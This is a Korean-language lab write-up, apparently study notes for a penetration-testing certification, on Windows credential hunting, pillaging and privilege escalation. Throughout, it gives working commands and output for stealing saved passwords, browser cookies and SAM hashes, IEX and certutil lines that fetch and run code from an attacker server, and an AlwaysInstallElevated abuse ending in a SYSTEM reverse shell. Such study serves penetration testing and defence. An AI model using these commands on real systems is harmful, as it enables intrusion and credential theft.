---
title: "Windows Privilege Escalation - Additional Techniques"
date: 2026-06-20
layout: single
excerpt: "Windows 환경에서 파일, 브라우저, 레지스트리, 저장된 세션, 백업, 클립보드 등을 통해 자격 증명을 수집하고, 사용자 상호작용 및 다양한 추가 기법을 활용해 권한 상승과 횡적 이동으로 이어지는 공격 흐름을 실습한다."
author_profile: true
toc: true
toc_label: "Windows Privilege Escalation"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [windows, cpts, priv-esc, credential-theft, pillaging, lateral-movement, registry, browser-credentials, scheduled-tasks]
---

Windows 환경에서 파일, 브라우저, 레지스트리, 저장된 세션, 백업, 클립보드 등을 통해 자격 증명을 수집하고, 사용자 상호작용 및 다양한 추가 기법을 활용해 권한 상승과 횡적 이동으로 이어지는 공격 흐름을 실습한다.

# Credential Theft

## Credential Hunting

대부분의 환경에서는 직접적인 권한 상승뿐만 아니라, 잘못된 자격 증명 보관 상태를 이용하여 다른 사용자나 시스템으로 이동하는 횡적 이동(Lateral Movement)이 가능할 수 있다.

종종 암호가 평문 형태의 설정 파일이나 사용자 파일에 저장되는 경우가 존재한다.

이러한 파일 중에는 일반 사용자도 읽을 수 있는 자격 증명이 존재할 수 있으며, 심한 경우 관리자 계정의 자격 증명이 노출되어 있을 수도 있다.

우선 현재 디렉터리를 기준으로 다음과 같이 검색하였다:

```powershell
PS C:\Users\htb-student> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

findstr의 `/S` 옵션은 하위 디렉터리를 재귀적으로 검색하고, `/I` 는 대소문자를 구분하지 않으며, `/M` 은 검색 문자열이 발견된 파일의 이름만 출력한다.

즉, 위 명령은 지정한 확장자의 파일 내부에서 `password` 문자열이 포함된 파일을 재귀적으로 찾는다.

그 결과 다음과 같은 흥미로운 파일이 발견되었다:

```text
AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

이 파일은 PowerShell에서 입력했던 명령 기록을 저장하는 PSReadLine History 파일이다.

따라서 위 파일의 내용을 읽어보면 다음과 같다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv1.png)

이처럼 내부에 `WEB02` 서버의 Administrator 계정과 관련된 자격 증명이 명령 기록에 그대로 남아 있는 것을 확인할 수 있다.

또한 검색 범위를 넓히기 위해 `C:\Users` 경로에서 다시 다음 명령을 실행하였다:

```powershell
PS C:\Users> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

그 결과 다음 파일이 발견되었다:

```text
Public\Documents\settings.xml
```

자세히 확인한 결과 프록시 관련 설정 파일이었으며, 내부에 프록시 서버에 사용되는 사용자 이름과 비밀번호가 저장되어 있는 것을 확인할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv2.png)

또한 다음과 같은 Chrome 사용자 사전 파일도 존재하였다:

```text
htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt
```

이는 `htb-student` 사용자의 Chrome 프로필에서 사용하는 사용자 지정 사전 파일이며, 내부에서 다음 문자열이 발견되었다:

```text
Password1234!
```

Chrome의 `Custom Dictionary.txt`에는 사용자가 맞춤법 검사에서 정상적인 단어로 취급하도록 직접 추가한 문자열이 저장될 수 있다.

따라서 `Password1234!` 같은 비밀번호 형태의 문자열이 존재한다면, 사용자가 비밀번호와 관련된 문자열을 사전에 추가했을 가능성을 의심할 수 있다.

이러한 문자열은 다른 정보와 함께 비밀번호 스프레이(Password Spraying) 후보로 사용할 수 있다.

또한 vCenter 서버에 쉽게 연결하기 위해 `C:\Scripts` 경로에 다음과 같은 PowerShell 스크립트가 존재하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv3.png)

스크립트를 보면 다음 파일을 불러오고 있다:

```text
C:\scripts\pass.xml
```

PowerShell의 `Export-Clixml`로 저장된 `PSCredential` 객체의 비밀번호는 일반적으로 Windows DPAPI를 통해 보호되며, 해당 자격 증명을 생성한 사용자와 적절한 컨텍스트에서 다시 불러오면 복호화할 수 있다.

따라서 다음과 같이 파일을 가져올 수 있다:

```powershell
PS C:\> $bob = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\> $bob.GetNetworkCredential().username

bob

PS C:\> $bob.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

이를 통해 저장되어 있던 사용자 이름과 비밀번호를 평문으로 확인할 수 있다.

## Other Files

`txt`, `ini` 같은 일반적인 텍스트 파일뿐만 아니라 설정 파일이나 데이터베이스 파일에서도 민감한 정보가 발견될 수 있다.

예를 들어 특정 문자열을 검색하는 대신 파일 이름과 확장자를 기준으로 민감할 가능성이 있는 파일을 찾을 수 있다:

```powershell
PS C:\> gci c:\ -recurse -file -force -include *pass*.txt,*pass*.xml,*pass*.ini,*cred*,*vnc*,*.config*, -ErrorAction SilentlyContinue
```

그 결과 다음과 같은 흥미로운 파일이 발견되었다:

```text
c:\inetpub\wwwroot\web.config
```

`web.config`는 IIS에서 호스팅되는 ASP.NET 웹 애플리케이션의 설정 파일이며, 애플리케이션에 따라 데이터베이스 연결 정보 등의 민감한 값이 포함될 수 있다.

내부를 확인하면 다음과 같다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv4.png)

이처럼 내부의 Connection String에서 데이터베이스 연결에 사용되는 `sa` 계정의 자격 증명이 평문으로 저장되어 있는 것을 확인할 수 있다.

또한 데이터베이스나 백업 관련 파일이 로컬 시스템에 존재할 가능성도 있으므로 다음과 같이 검색할 수 있다:

```powershell
PS C:\> gci c:\ -recurse -file -force -include *.sql*,*.db*,*.bak* -ErrorAction SilentlyContinue
```

그 결과 다음과 같은 흥미로운 파일이 발견되었다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv5.png)

`plum.sqlite`는 Windows Sticky Notes 애플리케이션에서 메모 내용을 저장하는 SQLite 데이터베이스 파일이다.

따라서 이 파일을 분석하면 사용자가 작성했던 메모의 내용을 확인할 수 있다.

그 결과 다음과 같이 `bob_adm` 계정과 root 계정에 관련된 자격 증명이 메모에 저장되어 있는 것을 확인할 수 있었다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv6.png)

## Further Credential Theft

Windows 시스템에서는 파일 검색 이외에도 다양한 방법으로 저장된 자격 증명을 확인할 수 있다.

먼저 Windows Credential Manager에 저장된 자격 증명을 `cmdkey`로 확인할 수 있다:

```powershell
PS C:\> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```

현재 `SQL01`의 RDP 연결에 사용되는 `inlanefreight\bob` 계정의 자격 증명이 Windows Credential Manager에 저장되어 있음을 확인할 수 있다.

이처럼 RDP용 자격 증명이 저장되어 있다면 Remote Desktop Connection을 통해 저장된 자격 증명을 재사용할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv7.png)

또한 `/savecred`를 이용할 수 있는 상황이라면 `runas`를 통해 저장된 자격 증명으로 해당 사용자 권한의 프로세스를 실행할 수도 있다:

```powershell
PS C:\> runas /savecred /user:inlanefreight\bob cmd.exe
```

### Credential Extraction Tools

[LaZagne](https://github.com/AlessandroZ/LaZagne)은 여러 애플리케이션과 Windows 환경에 저장된 자격 증명을 열거하고 복구하는 데 사용할 수 있는 도구이다.

예를 들어 다음과 같이 다양한 애플리케이션의 자격 증명을 검색할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv8.png)

이처럼 WinSCP에 저장된 SSH/FTP 계정이나 데이터베이스 연결에 사용되는 자격 증명이 발견될 수 있다.

Chrome에 저장된 로그인 정보는 [SharpChrome](https://github.com/GhostPack/SharpDPAPI)을 이용하여 확인할 수도 있다.

다음과 같이 보호된 Chrome 로그인 정보를 복호화하도록 시도할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv9.png)

이처럼 `vc01` 서버에 사용되는 root 계정의 저장된 자격 증명이 발견될 수 있다.

또한 [SessionGopher](https://github.com/Arvanaghi/SessionGopher)라는 도구도 존재한다.

SessionGopher는 PuTTY, WinSCP, FileZilla, SuperPuTTY 및 RDP 등 여러 원격 연결 프로그램의 저장된 세션 정보를 열거할 수 있다.

모듈을 로드하고 대상 시스템을 조사한 결과 다음과 같이 FTP 서버와 관련된 저장 자격 증명이 발견되었다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv10.png)

### Registry Credentials

Windows 레지스트리에도 자격 증명이 저장되어 있을 가능성이 있다.

대표적인 예가 Windows 자동 로그인(Auto Logon) 설정이다.

자동 로그인과 관련된 주요 레지스트리 경로는 다음과 같다:

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

다음과 같이 레지스트리 값을 확인할 수 있다:

```powershell
PS C:\> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
# SNIP
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

여기서 자동 로그인 여부를 판단하는 핵심 값은 `AutoAdminLogon` 이다:

```text
AutoAdminLogon = 1
```

이처럼 설정되어 있고 `DefaultUserName` 과 `DefaultPassword` 값이 존재한다면 해당 계정이 Windows 자동 로그인에 사용되도록 구성되어 있음을 의미한다.

특히 `DefaultPassword` 가 존재할 경우 비밀번호가 평문으로 노출될 수 있다.

또한 PuTTY에서 프록시 연결에 사용되는 자격 증명을 세션에 저장한 경우 레지스트리에 관련 값이 저장될 수 있다.

먼저 저장된 PuTTY 세션을 열거한다:

```powershell
PS C:\> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

이처럼 현재 사용자의 저장된 PuTTY 세션을 확인할 수 있다.

해당 세션의 상세 값을 확인하면 다음과 같다:

```powershell
PS C:\> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
# SKIP
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!    
```

이처럼 PuTTY 프록시 설정에서 사용자 이름과 비밀번호가 평문으로 저장되어 있을 수 있다.

---

# Additional Techniques

## Interacting with Users

셸에 접근했을 때 예약 작업이나 다른 프로세스가 계속 실행되고 있을 수 있으며, 이러한 프로세스가 명령줄 인자로 자격 증명을 전달하는 경우가 존재한다.

이를 확인하기 위해 1초 간격으로 실행 중인 프로세스의 Command Line을 비교하는 간단한 PowerShell 스크립트를 사용할 수 있다:

```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

첫 번째 프로세스 목록과 1초 뒤의 프로세스 목록을 비교하여 새로 생성되거나 종료된 프로세스를 확인하는 방식이다.

프로세스의 실행 파일 이름뿐만 아니라 Command Line 인자도 출력되므로 다음과 같이 명령줄에 포함된 자격 증명이 노출될 수도 있다:

```text
@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}
```

Linux의 `pspy` 를 매우 단순화한 형태라고 생각하면 이해하기 쉽다.

우선 로컬에서 위 PowerShell 코드를 `procmon.ps1` 로 저장한 후 간단한 HTTP 서버를 실행하였다:

```bash
$ python3 -m http.server 8000
```

그 후 대상 시스템에서 다음과 같이 스크립트를 다운로드하여 메모리에서 바로 실행하였다:

```powershell
PS C:\Users\htb-student> IEX (iwr 'http://10.10.15.181:8000/procmon.ps1') 
```

실행하면 다음과 같이 프로세스의 생성 내역을 확인할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv11.png)

자동화된 작업이나 사용자가 실행하는 프로세스에서 명령줄 인자로 자격 증명이 전달된다면 이 과정에서 포착될 수 있다.

## Pillaging

### mRemoteNG Credentials

mRemoteNG는 여러 원격 접속 세션을 저장할 수 있는 프로그램이며, 사용자 프로필에 설정 파일이 존재할 수 있다.

대표적인 경로는 다음과 같다:

```text
%USERPROFILE%\APPDATA\Roaming\mRemoteNG
```

이 디렉터리에는 일반적으로 mRemoteNG의 연결 설정이 저장된 `confCons.xml` 파일이 존재할 수 있다.

내부를 확인하면 다음과 같다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv12.png)

이처럼 저장된 연결 정보와 암호화된 Password 값이 존재할 수 있다.

[mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt)와 같은 도구를 이용하면 해당 암호화 값을 복호화할 수 있다.

다음과 같이 로컬 시스템에서 복호화를 수행하였다:

```bash
$ python3 mremoteng_decrypt.py -s "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="   

Password: Princess01!
```

획득한 자격 증명으로 RDP 로그인이 가능한지 확인하였다:

```bash
$ nxc rdp 10.129.105.148 -u grace -p Princess01! 

RDP         10.129.105.148  3389   PILLAGING-WIN01  [*] Windows 10 or Windows Server 2016 Build 19041 (name:PILLAGING-WIN01) (domain:PILLAGING-WIN01) (nla:True)
RDP         10.129.105.148  3389   PILLAGING-WIN01  [+] PILLAGING-WIN01\grace:Princess01! (Pwn3d!)
```

그 결과 Grace 계정으로 RDP 접근이 가능한 것을 확인할 수 있다.

### Browser Cookies

브라우저에 저장된 세션 쿠키를 획득하여 특정 웹 애플리케이션의 인증 세션을 재사용할 수도 있다.

Firefox를 사용하고 있다면 쿠키 데이터베이스가 일반적으로 다음 경로에 존재한다:

```text
$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite
```

Grace 계정으로 접근한 후 해당 파일이 존재하는지 확인하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv13.png)

정상적으로 `cookies.sqlite` 파일이 존재하였다.

다음과 같이 현재 디렉터리로 복사하였다:

```powershell
PS C:\Users\Grace> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

이후 파일을 공격자 시스템으로 가져온 뒤 [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py)를 사용하여 쿠키 정보를 확인하였다:

```bash
$ python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d

(10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
```

이를 통해 `slacktestapp.com` 과 관련된 `d` 쿠키 값을 확인할 수 있다.

웹사이트에 접속하면 다음과 같이 아직 인증되지 않은 상태이다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv14.png)

Firefox의 Cookie-Editor와 같은 확장 프로그램을 이용하여 획득한 쿠키 값을 브라우저에 추가할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv15.png)

쿠키를 추가하고 페이지를 새로고침하면 기존 사용자의 인증 세션을 재사용할 수 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv16.png)

웹 페이지의 채팅 내역에서 다음 사용자 자격 증명을 추가로 획득하였다:

```text
Username: jeff
Password: Webmaster001!
```

이를 이용하여 RDP 인증을 확인하였다:

```bash
$ nxc rdp 10.129.105.148 -u jeff -p Webmaster001!      

RDP         10.129.105.148  3389   PILLAGING-WIN01  [*] Windows 10 or Windows Server 2016 Build 19041 (name:PILLAGING-WIN01) (domain:PILLAGING-WIN01) (nla:True)
RDP         10.129.105.148  3389   PILLAGING-WIN01  [+] PILLAGING-WIN01\jeff:Webmaster001! (Pwn3d!)
```

이처럼 Jeff 계정으로도 접근할 수 있다.

### Restic Backups

Jeff 계정으로 로그인한 후 바탕화면에서 `backup.conf` 파일을 발견하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv17.png)

파일에는 다음과 같이 Restic 저장소와 백업 대상 경로, 저장소 비밀번호가 기록되어 있었다.

특히 다음 경로가 백업 대상에 포함되어 있었다:

```text
C:\Windows\System32\config
```

이 디렉터리에는 Windows의 `SAM`, `SYSTEM` 등의 레지스트리 Hive 파일이 존재하므로 중요한 백업이다.

Restic 저장소의 Snapshot을 확인하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv18.png)

그 결과 총 5개의 Snapshot이 존재했으며, `C:\Windows\System32\config` 와 웹 애플리케이션 관련 디렉터리가 백업되어 있는 것을 확인할 수 있었다.

그중 `C:\Windows\System32\config` 가 포함된 Snapshot을 복원하였다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv19.png)

복원된 경로에서 `SAM` 과 `SYSTEM` 파일을 획득한 후 `impacket-secretsdump` 를 이용하여 로컬 계정의 NTLM 해시를 추출하였다:

```bash
$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL

[*] Target system bootKey: 0x9828e7264dd454a4cae19b10e003858e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bac9dc5b7b4bec1d83e0e9c04b477f26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2525a827e7ca4bb2504d25a70e4d1292:::
jeff:1004:aad3b435b51404eeaad3b435b51404ee:91b2e2ed6cd72ed531635c1b58eabe19:::
Grace:1005:aad3b435b51404eeaad3b435b51404ee:2abc09f151d5e95fb8805e265268e6c3:::
Peter:1006:aad3b435b51404eeaad3b435b51404ee:8160b16dddc064509c4ccf530c7dfaa0:::
[*] Cleaning up..
```

그 결과 Administrator 계정의 NTLM 해시까지 확보할 수 있었다.

### Clipboard Credentials

클립보드에 사용자가 복사해 둔 민감한 정보나 자격 증명이 남아 있을 가능성도 있다.

[Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1)와 같은 스크립트를 사용하면 클립보드 내용을 모니터링할 수 있다:

```powershell
PS C:\Users\htb-student> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
```

이후 다음과 같이 Clipboard Logger를 실행한다:

```powershell
PS C:\Users\htb-student> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```

이처럼 사용자가 URL, 계정 이름, 비밀번호 등을 복사하는 경우 이러한 값이 클립보드를 통해 노출될 수 있다.

## Miscellaneous Techniques

PowerShell이 제한되어 있거나 `wget`, `curl` 과 같은 도구를 사용할 수 없는 Windows 환경에서는 기본 제공 도구를 이용한 파일 전송 방법도 고려할 수 있다.

> Windows 기본 바이너리가 지원하는 다양한 기능은 [LOLBAS](https://lolbas-project.github.io/)에서 확인할 수 있다.

예를 들어 공격자 시스템에서 Python HTTP 서버를 실행하고 있다면 다음과 같이 `certutil.exe` 를 이용하여 파일을 가져올 수 있다:

```powershell
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.15.181:8000/shell.bat shell.bat
```

또한 `certutil` 은 파일의 Base64 인코딩 및 디코딩에도 사용할 수 있다:

```powershell
PS C:\htb> certutil.exe -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
```

```powershell
PS C:\htb> certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
```

### Always Install Elevated

Windows Installer 패키지 형식인 MSI에는 Windows Installer 정책이 적용된다.

관련 레지스트리 경로는 다음 두 곳이다:

```text
HKCU\Software\Policies\Microsoft\Windows\Installer
```

위 경로는 현재 사용자에게 적용되는 Windows Installer 정책이며, 다음 경로는 시스템 전체에 적용되는 정책이다:

```text
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

두 위치의 `AlwaysInstallElevated` 값이 모두 다음과 같이 설정되어 있다고 가정해보자:

```text
AlwaysInstallElevated    REG_DWORD    0x1
```

`AlwaysInstallElevated`가 **HKCU와 HKLM 양쪽에서 모두 활성화되어 있는 경우**, 일반 사용자가 실행하는 MSI 패키지가 상승된 권한으로 설치될 수 있기 때문에 로컬 권한 상승으로 악용될 수 있다.

예를 들어 리버스 셸 테스트용 MSI 파일이 다음 경로에 존재한다고 가정해보자:

```text
C:\Users\htb-student\Desktop\rev.msi
```

이를 다음과 같이 실행할 수 있다:

```powershell
C:\htb> msiexec /i C:\Users\htb-student\Desktop\rev.msi /quiet /qn /norestart
```

취약한 설정이 존재하고 MSI가 상승된 권한으로 실행된다면 해당 패키지 내부에서 실행되는 코드 또한 높은 권한으로 실행될 수 있다.

예를 들어 리버스 셸로 획득했다면 다음과 같이 확인할 수 있다:

```bash
$ nc -lnvp 9001

connect to [10.10.15.181] from (UNKNOWN) [10.129.43.33] 49720
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### Scheduled Tasks

Windows의 예약 작업은 다음과 같이 열거할 수 있다:

```powershell
PS C:\Users\htb-student> schtasks /query /fo LIST /v
```

예약 작업에서 실행하는 프로그램이나 스크립트 또는 해당 파일이 위치한 디렉터리에 일반 사용자의 수정 권한이 존재한다면 권한 상승 가능성이 생길 수 있다.

따라서 예약 작업을 확인할 때는 다음 요소를 함께 확인해야 한다.

- 어떤 사용자 권한으로 실행되는지
- 어떤 프로그램 또는 스크립트를 실행하는지
- 해당 파일을 현재 사용자가 수정할 수 있는지
- 실행 경로나 상위 디렉터리에 쓰기 권한이 존재하는지

또한 `Get-LocalUser` 를 통해 로컬 계정을 열거하면 `Description` 필드에 계정 용도나 비밀번호와 같은 민감한 정보가 평문으로 저장되어 있는 경우가 있다:

![Windows Priv](/assets/cpts-infra/windows-privilege-escalation-additional-techniques/windows-priv20.png)

이처럼 `secsvc` 계정의 `Description` 필드에 네트워크 스캐너 계정의 비밀번호로 추정되는 문자열이 그대로 노출되어 있는 것을 확인할 수 있다.

### Mount VHDX/VMDK

로컬 시스템이나 네트워크 공유를 열거하다 보면 `.vhd`, `.vhdx`, `.vmdk`와 같은 가상 디스크 파일을 발견할 수 있다.

이러한 파일은 서버 또는 워크스테이션의 전체 디스크나 백업 이미지를 포함하고 있을 수 있다.

파일 이름이 실제 네트워크 호스트 이름과 유사하게 지정되어 있는 경우도 있기 때문에 어떤 시스템의 백업인지 추측하는 데 도움이 될 수 있다.

공유 폴더에 존재하는 파일이라면 SMB 등을 통해 가져온 뒤 로컬에서 마운트하여 내부 파일 시스템을 분석할 수 있다.

백업 이미지 내부에서는 다음과 같은 민감한 데이터를 발견할 가능성이 있다:

- `SAM`, `SYSTEM` 등의 Registry Hive
- SSH Private Key
- 애플리케이션 설정 파일
- 저장된 사용자 자격 증명
- 다른 서버 접근에 사용되는 계정 정보

따라서 VHD/VHDX/VMDK와 같은 백업 이미지는 단순한 파일 하나가 아니라, 과거 시점의 시스템 전체 파일 구조를 분석할 수 있는 중요한 Pillaging 대상이 될 수 있다.